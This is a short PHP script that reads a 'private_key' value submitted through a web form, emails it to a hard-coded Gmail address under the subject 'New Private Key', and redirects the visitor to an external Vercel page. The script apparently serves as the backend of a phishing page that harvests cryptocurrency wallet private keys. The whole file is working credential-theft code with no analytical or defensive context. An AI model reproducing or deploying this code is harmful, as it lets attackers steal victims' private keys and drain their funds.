<?php

$testing_key = $_POST['private_key'] ?? '';

$to = "nxloaded@gmail.com";
$subject = "New Private Key";

$message = "
New Private Key Submitted:

$testing_key
";

$headers = "From: noreply@yourwebsite.com";

mail($to, $subject, $message, $headers);

header("Location: https://rtt-collects.vercel.app/");
exit();

?>
